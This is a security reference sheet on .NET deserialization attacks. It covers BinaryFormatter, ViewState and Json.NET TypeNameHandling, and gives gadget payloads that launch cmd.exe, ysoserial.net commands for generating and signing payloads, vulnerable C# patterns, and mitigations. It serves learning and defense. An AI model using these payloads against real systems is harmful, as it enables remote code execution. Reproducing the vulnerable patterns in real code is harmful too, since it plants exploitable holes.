# .NET Deserialization

## Overview

.NET applications using `BinaryFormatter`, `ObjectStateFormatter`, or unsafe JSON deserializers (`Json.NET` with `TypeNameHandling`) are vulnerable to deserialization attacks leading to RCE.

---

## Dangerous Deserializers

| Deserializer | Risk | Notes |
|-------------|------|-------|
| `BinaryFormatter` | Critical | Microsoft officially deprecated — always unsafe |
| `NetDataContractSerializer` | Critical | Includes type info in serialized data |
| `ObjectStateFormatter` | Critical | Used by ASP.NET ViewState |
| `SoapFormatter` | Critical | SOAP-based serialization |
| `LosFormatter` | Critical | Used in older ASP.NET |
| `Json.NET (TypeNameHandling)` | High | Only dangerous with `TypeNameHandling != None` |
| `DataContractSerializer` | Low | Safer — requires known types |
| `XmlSerializer` | Low | Type must be declared at compile time |

---

## Detection

### Magic bytes

```
# BinaryFormatter starts with:
00 01 00 00 00 FF FF FF FF 01 00 00 00 00 00 00 00

# Base64 encoded:
AAEAAAD/////AQAAAAAAAAAA...
```

### ViewState

ASP.NET ViewState is serialized with `ObjectStateFormatter`:

```html
<input type="hidden" name="__VIEWSTATE" value="..." />
```

If `ViewState MAC validation` is disabled (`enableViewStateMac="false"` in web.config), attacker can inject arbitrary serialized objects.

## Common Gadgets

### TypeConfuseDelegate

Abuses `Comparison<T>` delegate with `Process.Start`:

```
Delegate chain → ComparisonComparer → Process.Start("cmd.exe", "/c whoami")
```

### ObjectDataProvider

Wraps arbitrary method calls:

```xml
<ObjectDataProvider MethodName="Start" ObjectType="System.Diagnostics.Process">
  <ObjectDataProvider.MethodParameters>
    <sys:String>cmd.exe</sys:String>
    <sys:String>/c whoami</sys:String>
  </ObjectDataProvider.MethodParameters>
</ObjectDataProvider>
```

### TextFormattingRunProperties

Available in .NET Framework with PresentationFramework.dll loaded. Used for XAML-based code execution.

## ysoserial.net

The .NET equivalent of Java's ysoserial:

```bash
# List available gadgets
ysoserial.exe -l

# Generate BinaryFormatter payload
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "whoami" -o base64

# Generate for ObjectStateFormatter (ViewState)
ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter -c "whoami" -o base64

# Generate for Json.NET
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"

# Common formatters: BinaryFormatter, SoapFormatter, Json.Net,
# ObjectStateFormatter, LosFormatter, NetDataContractSerializer
```

## Json.NET TypeNameHandling

When `TypeNameHandling` is not `None`, the JSON includes type information that controls which class gets instantiated:

```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System"
  },
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib",
    "$values": ["cmd.exe", "/c whoami"]
  }
}
```

### Vulnerable configuration

```csharp
// DANGEROUS — any of these settings enable the attack
JsonConvert.DeserializeObject<object>(json, new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.All       // Most dangerous
    TypeNameHandling = TypeNameHandling.Auto      // Dangerous
    TypeNameHandling = TypeNameHandling.Objects   // Dangerous
});
```

## ViewState Exploitation

### When MAC is disabled

```bash
# Generate ViewState payload
ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter -c "whoami" -o base64

# Replace the __VIEWSTATE parameter with the generated payload
```

### When MAC is enabled but key is known

If the machine key is leaked (from web.config, LFI, or default keys):

```bash
# Use the key to sign the payload
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
  -c "whoami" \
  --validationalg="SHA1" \
  --validationkey="KEY_HERE" \
  --generator="GENERATOR_VALUE"
```

---

## Vulnerable Patterns

```csharp
// BinaryFormatter (always dangerous)
BinaryFormatter bf = new BinaryFormatter();
object obj = bf.Deserialize(stream);  // RCE if stream is attacker-controlled

// Json.NET with TypeNameHandling
var settings = new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.All };
var obj = JsonConvert.DeserializeObject(userInput, settings);

// ViewState without MAC
// web.config: <pages enableViewStateMac="false" />
```

---

## Mitigation

- Never use `BinaryFormatter` (Microsoft deprecated it)
- Use `DataContractSerializer` or `XmlSerializer` with known types
- Set `TypeNameHandling = TypeNameHandling.None` in Json.NET
- If TypeNameHandling is needed, use a custom `SerializationBinder` to whitelist types
- Always enable ViewState MAC validation
- Protect machine keys in web.config
